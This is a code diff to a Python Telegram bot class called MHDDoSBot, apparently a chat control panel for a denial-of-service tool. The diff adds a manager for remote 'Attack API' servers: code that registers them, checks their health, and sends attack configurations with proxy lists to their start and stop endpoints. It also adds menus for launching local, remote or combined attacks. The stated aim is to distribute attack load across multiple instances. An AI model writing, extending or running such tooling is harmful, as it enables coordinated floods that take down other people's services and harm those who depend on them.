@@ -14,7 +14,7 @@ import traceback
 from dataclasses import dataclass, field
 from enum import Enum, auto
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from json import JSONDecodeError, load
+from json import JSONDecodeError, dump, load
 from pathlib import Path
 from socket import gethostbyname
 from threading import Event, Thread, active_count
@@ -23,7 +23,7 @@ from typing import Any, Dict, List, Optional, Tuple
 
 from icmplib import ping as icmp_ping
 from psutil import cpu_percent, net_io_counters, virtual_memory
-from requests import get as requests_get
+from requests import get as requests_get, post as requests_post, exceptions as requests_exceptions
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.error import TelegramError
 from telegram.ext import (
@@ -173,6 +173,9 @@ class ConversationState(Enum):
     TOOLS_MENU = auto()
     TOOLS_INPUT = auto()
     PROXY_MANAGEMENT = auto()  # New state for proxy management
+    API_MANAGEMENT = auto()  # State for API management
+    API_ADD = auto()  # State for adding API
+    SELECT_ATTACK_MODE = auto()  # State for selecting local vs API attack
 
 
 @dataclass
@@ -271,6 +274,37 @@ class ProxyStats:
     last_updated: float = 0
 
 
+@dataclass
+class AttackAPI:
+    """Configuration for a remote Attack API endpoint."""
+    name: str
+    url: str
+    api_key: str = ""
+    enabled: bool = True
+    last_check: float = 0
+    is_healthy: bool = False
+    max_threads: int = 0
+    
+    def to_dict(self) -> dict:
+        """Convert to dictionary for JSON serialization."""
+        return {
+            "name": self.name,
+            "url": self.url,
+            "api_key": self.api_key,
+            "enabled": self.enabled,
+        }
+    
+    @classmethod
+    def from_dict(cls, data: dict) -> 'AttackAPI':
+        """Create from dictionary."""
+        return cls(
+            name=data.get("name", ""),
+            url=data.get("url", ""),
+            api_key=data.get("api_key", ""),
+            enabled=data.get("enabled", True),
+        )
+
+
 def get_proxy_file_path(proxy_type: int) -> Path:
     """Get the proxy file path based on proxy type."""
     proxy_type_names = {
@@ -280,6 +314,192 @@ def get_proxy_file_path(proxy_type: int) -> Path:
     }
     proxy_name = proxy_type_names.get(proxy_type, "http")
     return __dir__ / f"files/proxies/{proxy_name}.txt"
+
+
+def load_attack_apis() -> List[AttackAPI]:
+    """Load attack APIs from config.json."""
+    config_path = __dir__ / "config.json"
+    apis = []
+    
+    try:
+        if config_path.exists():
+            with open(config_path) as f:
+                config = load(f)
+                api_list = config.get("attack-apis", [])
+                for api_data in api_list:
+                    apis.append(AttackAPI.from_dict(api_data))
+    except Exception as e:
+        logger.error(f"Error loading attack APIs: {e}")
+    
+    return apis
+
+
+def save_attack_apis(apis: List[AttackAPI]) -> bool:
+    """Save attack APIs to config.json."""
+    config_path = __dir__ / "config.json"
+    
+    try:
+        # Load existing config
+        config = {}
+        if config_path.exists():
+            with open(config_path) as f:
+                config = load(f)
+        
+        # Update APIs
+        config["attack-apis"] = [api.to_dict() for api in apis]
+        
+        # Save config
+        with open(config_path, "w") as f:
+            dump(config, f, indent=2)
+        
+        return True
+    except Exception as e:
+        logger.error(f"Error saving attack APIs: {e}")
+        return False
+
+
+def check_api_health(api: AttackAPI) -> Tuple[bool, Dict[str, Any]]:
+    """
+    Check if an API endpoint is healthy.
+    
+    Returns:
+        Tuple of (is_healthy, info_dict)
+    """
+    try:
+        headers = {}
+        if api.api_key:
+            headers["X-API-Key"] = api.api_key
+        
+        response = requests_get(
+            f"{api.url.rstrip('/')}/health",
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            data = response.json()
+            return True, data
+        else:
+            return False, {"error": f"Status code: {response.status_code}"}
+            
+    except requests_exceptions.Timeout:
+        return False, {"error": "Connection timeout"}
+    except requests_exceptions.ConnectionError:
+        return False, {"error": "Connection failed"}
+    except Exception as e:
+        return False, {"error": str(e)}
+
+
+def get_api_info(api: AttackAPI) -> Dict[str, Any]:
+    """Get detailed info from an API endpoint."""
+    try:
+        headers = {}
+        if api.api_key:
+            headers["X-API-Key"] = api.api_key
+        
+        response = requests_get(
+            f"{api.url.rstrip('/')}/info",
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            return response.json()
+        else:
+            return {"success": False, "error": f"Status code: {response.status_code}"}
+            
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def start_api_attack(api: AttackAPI, config: dict, proxies: Optional[List[str]] = None) -> Tuple[bool, str, str]:
+    """
+    Start an attack via API endpoint.
+    
+    Args:
+        api: The API endpoint to use
+        config: Attack configuration dict
+        proxies: Optional list of proxy strings
+    
+    Returns:
+        Tuple of (success, message, attack_id)
+    """
+    try:
+        headers = {"Content-Type": "application/json"}
+        if api.api_key:
+            headers["X-API-Key"] = api.api_key
+        
+        # Add proxies to config if provided
+        if proxies:
+            config["proxies"] = proxies
+        
+        response = requests_post(
+            f"{api.url.rstrip('/')}/attack/start",
+            headers=headers,
+            json=config,
+            timeout=30
+        )
+        
+        data = response.json()
+        
+        if response.status_code == 200 and data.get("success"):
+            return True, data.get("message", "Attack started"), data.get("attack_id", "")
+        else:
+            return False, data.get("error", "Unknown error"), ""
+            
+    except requests_exceptions.Timeout:
+        return False, "API connection timeout", ""
+    except requests_exceptions.ConnectionError:
+        return False, "API connection failed", ""
+    except Exception as e:
+        return False, str(e), ""
+
+
+def stop_api_attack(api: AttackAPI, attack_id: str = "all") -> Tuple[bool, str]:
+    """Stop an attack via API endpoint."""
+    try:
+        headers = {"Content-Type": "application/json"}
+        if api.api_key:
+            headers["X-API-Key"] = api.api_key
+        
+        response = requests_post(
+            f"{api.url.rstrip('/')}/attack/stop",
+            headers=headers,
+            json={"attack_id": attack_id},
+            timeout=30
+        )
+        
+        data = response.json()
+        
+        if response.status_code == 200 and data.get("success"):
+            return True, data.get("message", "Attack stopped")
+        else:
+            return False, data.get("error", "Unknown error")
+            
+    except Exception as e:
+        return False, str(e)
+
+
+def get_api_attack_status(api: AttackAPI, attack_id: Optional[str] = None) -> Dict[str, Any]:
+    """Get attack status from API endpoint."""
+    try:
+        headers = {}
+        if api.api_key:
+            headers["X-API-Key"] = api.api_key
+        
+        url = f"{api.url.rstrip('/')}/attack/status"
+        if attack_id:
+            url += f"?attack_id={attack_id}"
+        
+        response = requests_get(url, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return response.json()
+        else:
+            return {"success": False, "error": f"Status code: {response.status_code}"}
+            
+    except Exception as e:
+        return {"success": False, "error": str(e)}
 
 
 def get_proxy_stats() -> ProxyStats:
@@ -449,6 +669,9 @@ class MHDDoSBot:
         self.active_sessions: Dict[int, AttackSession] = {}
         self.user_tools_context: Dict[int, str] = {}
         self.user_state_context: Dict[int, str] = {}  # Track which state user is in for text input
+        self.attack_apis: List[AttackAPI] = load_attack_apis()  # Load registered APIs
+        self.api_attack_ids: Dict[int, Dict[str, str]] = {}  # user_id -> {api_name: attack_id}
+        self.user_api_context: Dict[int, str] = {}  # Track API-related text input context
         
     def get_user_config(self, user_id: int) -> AttackConfig:
         """Get or create user configuration."""
@@ -461,6 +684,39 @@ class MHDDoSBot:
         if not self.allowed_users:
             return True
         return user_id in self.allowed_users
+    
+    def get_enabled_apis(self) -> List[AttackAPI]:
+        """Get list of enabled APIs."""
+        return [api for api in self.attack_apis if api.enabled]
+    
+    def add_api(self, api: AttackAPI) -> bool:
+        """Add a new API endpoint."""
+        # Check for duplicate names
+        for existing in self.attack_apis:
+            if existing.name == api.name:
+                return False
+        
+        self.attack_apis.append(api)
+        save_attack_apis(self.attack_apis)
+        return True
+    
+    def remove_api(self, name: str) -> bool:
+        """Remove an API endpoint by name."""
+        for i, api in enumerate(self.attack_apis):
+            if api.name == name:
+                del self.attack_apis[i]
+                save_attack_apis(self.attack_apis)
+                return True
+        return False
+    
+    def toggle_api(self, name: str) -> Optional[bool]:
+        """Toggle API enabled status. Returns new status or None if not found."""
+        for api in self.attack_apis:
+            if api.name == name:
+                api.enabled = not api.enabled
+                save_attack_apis(self.attack_apis)
+                return api.enabled
+        return None
     
     async def send_error(self, update: Update, error_msg: str, show_menu: bool = True) -> None:
         """Send error message to user with optional main menu."""
@@ -496,6 +752,10 @@ class MHDDoSBot:
     # Keyboard generators
     def get_main_menu_keyboard(self) -> InlineKeyboardMarkup:
         """Generate main menu keyboard."""
+        # Count enabled APIs
+        enabled_apis = len(self.get_enabled_apis())
+        api_text = f"🌐 API Manager ({enabled_apis})" if enabled_apis > 0 else "🌐 API Manager"
+        
         keyboard = [
             [
                 InlineKeyboardButton("🔥 Layer 7", callback_data="layer_7"),
@@ -507,6 +767,7 @@ class MHDDoSBot:
             ],
             [
                 InlineKeyboardButton("🔄 Proxy Manager", callback_data="proxy_manager"),
+                InlineKeyboardButton(api_text, callback_data="api_manager"),
             ],
             [InlineKeyboardButton("❓ Help", callback_data="help")],
         ]
@@ -669,6 +930,54 @@ class MHDDoSBot:
         ]
         return InlineKeyboardMarkup(keyboard)
     
+    def get_api_manager_keyboard(self) -> InlineKeyboardMarkup:
+        """Generate API manager keyboard."""
+        keyboard = [
+            [
+                InlineKeyboardButton("📋 List APIs", callback_data="api_list"),
+                InlineKeyboardButton("➕ Add API", callback_data="api_add"),
+            ],
+            [
+                InlineKeyboardButton("🔍 Check All APIs", callback_data="api_check_all"),
+            ],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
+        ]
+        return InlineKeyboardMarkup(keyboard)
+    
+    def get_api_detail_keyboard(self, api_name: str, is_enabled: bool) -> InlineKeyboardMarkup:
+        """Generate API detail keyboard."""
+        toggle_text = "⏸️ Disable" if is_enabled else "▶️ Enable"
+        keyboard = [
+            [
+                InlineKeyboardButton("🔍 Check Health", callback_data=f"api_check_{api_name}"),
+                InlineKeyboardButton(toggle_text, callback_data=f"api_toggle_{api_name}"),
+            ],
+            [
+                InlineKeyboardButton("🗑️ Remove", callback_data=f"api_remove_{api_name}"),
+            ],
+            [InlineKeyboardButton("⬅️ Back to API List", callback_data="api_list")],
+        ]
+        return InlineKeyboardMarkup(keyboard)
+    
+    def get_attack_mode_keyboard(self) -> InlineKeyboardMarkup:
+        """Generate attack mode selection keyboard."""
+        enabled_apis = self.get_enabled_apis()
+        
+        keyboard = [
+            [InlineKeyboardButton("🖥️ Local Attack", callback_data="attack_mode_local")],
+        ]
+        
+        if enabled_apis:
+            keyboard.append([
+                InlineKeyboardButton(f"🌐 API Attack ({len(enabled_apis)} APIs)", callback_data="attack_mode_api"),
+            ])
+            keyboard.append([
+                InlineKeyboardButton("🔀 All (Local + APIs)", callback_data="attack_mode_all"),
+            ])
+        
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
+        return InlineKeyboardMarkup(keyboard)
+    
     def get_stop_keyboard(self) -> InlineKeyboardMarkup:
         """Generate stop attack keyboard."""
         keyboard = [
@@ -770,6 +1079,11 @@ Select an option from the menu below to begin.
 🔄 Proxy Manager:
 • View proxy statistics
 • Update/refresh proxy lists
+
+🌐 API Manager:
+• Add remote Attack API servers
+• Distribute attacks across multiple instances
+• Check API health status
 
 ⚙️ System Limits:
 • Max Threads: {SYSTEM_MAX_THREADS}
@@ -977,6 +1291,220 @@ Select an option to manage proxies:
                 )
             
             return ConversationState.PROXY_MANAGEMENT.value
+        
+        # API Management handlers
+        elif data == "api_manager":
+            enabled_count = len(self.get_enabled_apis())
+            total_count = len(self.attack_apis)
+            
+            api_text = f"""
+🌐 API Manager
+--------------
+📊 Registered APIs: {total_count}
+✅ Enabled: {enabled_count}
+
+Manage remote Attack API servers to distribute
+attack load across multiple instances.
+
+Select an option:
+"""
+            await self.safe_edit_message(
+                query,
+                api_text,
+                reply_markup=self.get_api_manager_keyboard()
+            )
+            return ConversationState.API_MANAGEMENT.value
+        
+        elif data == "api_list":
+            if not self.attack_apis:
+                api_text = """
+🌐 API List
+-----------
+📭 No APIs registered.
+
+Use ➕ Add API to register a new Attack API server.
+"""
+            else:
+                api_lines = []
+                for api in self.attack_apis:
+                    status = "✅" if api.enabled else "⏸️"
+                    api_lines.append(f"{status} {api.name}: {api.url}")
+                
+                api_text = f"""
+🌐 API List ({len(self.attack_apis)} total)
+-----------
+{chr(10).join(api_lines)}
+
+Tap an API name below to manage it:
+"""
+            
+            # Create keyboard with API buttons
+            keyboard = []
+            for api in self.attack_apis:
+                status = "✅" if api.enabled else "⏸️"
+                keyboard.append([
+                    InlineKeyboardButton(f"{status} {api.name}", callback_data=f"api_detail_{api.name}")
+                ])
+            
+            keyboard.append([InlineKeyboardButton("➕ Add API", callback_data="api_add")])
+            keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="api_manager")])
+            
+            await self.safe_edit_message(
+                query,
+                api_text,
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+            return ConversationState.API_MANAGEMENT.value
+        
+        elif data == "api_add":
+            self.user_state_context[user_id] = "api_add_name"
+            self.user_api_context[user_id] = ""
+            
+            await self.safe_edit_message(
+                query,
+                """
+➕ Add New API
+--------------
+Step 1/3: Enter a name for this API (e.g., "server1"):
+"""
+            )
+            return ConversationState.API_ADD.value
+        
+        elif data.startswith("api_detail_"):
+            api_name = data.replace("api_detail_", "")
+            api = None
+            for a in self.attack_apis:
+                if a.name == api_name:
+                    api = a
+                    break
+            
+            if not api:
+                await self.safe_edit_message(
+                    query,
+                    f"⚠️ API '{api_name}' not found.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+                return ConversationState.API_MANAGEMENT.value
+            
+            # Check health
+            is_healthy, health_info = check_api_health(api)
+            api.is_healthy = is_healthy
+            api.last_check = time()
+            
+            health_status = "🟢 Healthy" if is_healthy else f"🔴 Unhealthy"
+            if is_healthy:
+                api.max_threads = health_info.get("max_threads", 0)
+                health_details = f"""
+• Active Attacks: {health_info.get('active_attacks', 0)}
+• Max Threads: {health_info.get('max_threads', 0)}
+• Current Threads: {health_info.get('current_threads', 0)}"""
+            else:
+                health_details = f"\n• Error: {health_info.get('error', 'Unknown')}"
+            
+            status = "✅ Enabled" if api.enabled else "⏸️ Disabled"
+            
+            detail_text = f"""
+🌐 API: {api.name}
+------------------
+📍 URL: {api.url}
+🔑 API Key: {'***' + api.api_key[-4:] if api.api_key else 'None'}
+📊 Status: {status}
+🏥 Health: {health_status}
+{health_details}
+"""
+            await self.safe_edit_message(
+                query,
+                detail_text,
+                reply_markup=self.get_api_detail_keyboard(api_name, api.enabled)
+            )
+            return ConversationState.API_MANAGEMENT.value
+        
+        elif data.startswith("api_toggle_"):
+            api_name = data.replace("api_toggle_", "")
+            new_status = self.toggle_api(api_name)
+            
+            if new_status is not None:
+                status_text = "enabled" if new_status else "disabled"
+                await self.safe_edit_message(
+                    query,
+                    f"✅ API '{api_name}' has been {status_text}.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            else:
+                await self.safe_edit_message(
+                    query,
+                    f"⚠️ API '{api_name}' not found.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            return ConversationState.API_MANAGEMENT.value
+        
+        elif data.startswith("api_remove_"):
+            api_name = data.replace("api_remove_", "")
+            if self.remove_api(api_name):
+                await self.safe_edit_message(
+                    query,
+                    f"🗑️ API '{api_name}' has been removed.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            else:
+                await self.safe_edit_message(
+                    query,
+                    f"⚠️ API '{api_name}' not found.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            return ConversationState.API_MANAGEMENT.value
+        
+        elif data.startswith("api_check_"):
+            api_name = data.replace("api_check_", "")
+            
+            if api_name == "all":
+                await self.safe_edit_message(query, "🔍 Checking all APIs...")
+                
+                results = []
+                for api in self.attack_apis:
+                    is_healthy, info = check_api_health(api)
+                    api.is_healthy = is_healthy
+                    api.last_check = time()
+                    
+                    status = "🟢" if is_healthy else "🔴"
+                    results.append(f"{status} {api.name}: {'OK' if is_healthy else info.get('error', 'Error')}")
+                
+                result_text = "🔍 API Health Check Results:\n\n" + "\n".join(results) if results else "No APIs registered."
+                
+                await self.safe_edit_message(
+                    query,
+                    result_text,
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            else:
+                api = None
+                for a in self.attack_apis:
+                    if a.name == api_name:
+                        api = a
+                        break
+                
+                if api:
+                    await self.safe_edit_message(query, f"🔍 Checking {api_name}...")
+                    is_healthy, info = check_api_health(api)
+                    api.is_healthy = is_healthy
+                    api.last_check = time()
+                    
+                    status = "🟢 Healthy" if is_healthy else "🔴 Unhealthy"
+                    details = f"Max Threads: {info.get('max_threads', 'N/A')}" if is_healthy else f"Error: {info.get('error', 'Unknown')}"
+                    
+                    await self.safe_edit_message(
+                        query,
+                        f"🔍 Health Check: {api_name}\n\n{status}\n{details}",
+                        reply_markup=self.get_api_detail_keyboard(api_name, api.enabled)
+                    )
+                else:
+                    await self.safe_edit_message(
+                        query,
+                        f"⚠️ API '{api_name}' not found.",
+                        reply_markup=self.get_api_manager_keyboard()
+                    )
+            
+            return ConversationState.API_MANAGEMENT.value
         
         elif data == "status" or data == "refresh_status":
             if user_id not in self.active_sessions or not self.active_sessions[user_id].is_running:
@@ -1269,8 +1797,122 @@ Use inline buttons to navigate and configure attacks.
         """Process text input. Separated for better error handling."""
         state_context = self.user_state_context.get(user_id, "")
         
+        # Handle API addition states
+        if state_context == "api_add_name":
+            # Validate API name
+            api_name = text.strip().lower().replace(" ", "_")
+            if not api_name:
+                await self.safe_reply(update.message, "⚠️ Invalid name. Please enter a valid API name:")
+                return ConversationState.API_ADD.value
+            
+            # Check for existing API with same name
+            for api in self.attack_apis:
+                if api.name == api_name:
+                    await self.safe_reply(
+                        update.message,
+                        f"⚠️ API '{api_name}' already exists. Please choose a different name:"
+                    )
+                    return ConversationState.API_ADD.value
+            
+            self.user_api_context[user_id] = api_name
+            self.user_state_context[user_id] = "api_add_url"
+            
+            await self.safe_reply(
+                update.message,
+                f"""
+✓ Name: {api_name}
+
+Step 2/3: Enter the API URL (e.g., http://server:5000):
+"""
+            )
+            return ConversationState.API_ADD.value
+        
+        elif state_context == "api_add_url":
+            # Validate URL
+            url = text.strip()
+            if not url.startswith("http"):
+                url = "http://" + url
+            
+            # Remove trailing slash
+            url = url.rstrip("/")
+            
+            # Store URL temporarily
+            api_name = self.user_api_context.get(user_id, "")
+            self.user_api_context[user_id] = f"{api_name}|{url}"
+            self.user_state_context[user_id] = "api_add_key"
+            
+            await self.safe_reply(
+                update.message,
+                f"""
+✓ Name: {api_name}
+✓ URL: {url}
+
+Step 3/3: Enter API key (or type 'none' for no key):
+"""
+            )
+            return ConversationState.API_ADD.value
+        
+        elif state_context == "api_add_key":
+            # Finalize API addition
+            api_key = text.strip()
+            if api_key.lower() == "none":
+                api_key = ""
+            
+            context_data = self.user_api_context.get(user_id, "")
+            if "|" not in context_data:
+                await self.safe_reply(
+                    update.message,
+                    "⚠️ Error: Missing API data. Please start over.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+                self.user_state_context[user_id] = ""
+                self.user_api_context[user_id] = ""
+                return ConversationState.API_MANAGEMENT.value
+            
+            api_name, api_url = context_data.split("|", 1)
+            
+            # Create and add API
+            new_api = AttackAPI(
+                name=api_name,
+                url=api_url,
+                api_key=api_key,
+                enabled=True
+            )
+            
+            # Check health before adding
+            is_healthy, health_info = check_api_health(new_api)
+            new_api.is_healthy = is_healthy
+            new_api.last_check = time()
+            
+            if self.add_api(new_api):
+                health_status = "🟢 Healthy" if is_healthy else f"🔴 Unhealthy ({health_info.get('error', 'Unknown')})"
+                
+                await self.safe_reply(
+                    update.message,
+                    f"""
+✅ API Added Successfully!
+------------------------
+📛 Name: {api_name}
+📍 URL: {api_url}
+🔑 Key: {'Set' if api_key else 'None'}
+🏥 Status: {health_status}
+""",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            else:
+                await self.safe_reply(
+                    update.message,
+                    f"⚠️ Failed to add API '{api_name}'. It may already exist.",
+                    reply_markup=self.get_api_manager_keyboard()
+                )
+            
+            # Clear context
+            self.user_state_context[user_id] = ""
+            self.user_api_context[user_id] = ""
+            return ConversationState.API_MANAGEMENT.value
+        
         # Handle based on explicit state context
-        if state_context == "enter_target" or (not config.target and config.method):
+        elif state_context == "enter_target" or (not config.target and config.method):
             # Entering target
             target = text
             
@@ -1970,6 +2612,16 @@ Use inline buttons to navigate and configure attacks.
                     CallbackQueryHandler(self.button_callback),
                 ],
                 ConversationState.PROXY_MANAGEMENT.value: [
+                    CallbackQueryHandler(self.button_callback),
+                ],
+                ConversationState.API_MANAGEMENT.value: [
+                    CallbackQueryHandler(self.button_callback),
+                ],
+                ConversationState.API_ADD.value: [
+                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
+                    CallbackQueryHandler(self.button_callback),
+                ],
+                ConversationState.SELECT_ATTACK_MODE.value: [
                     CallbackQueryHandler(self.button_callback),
                 ],
             },
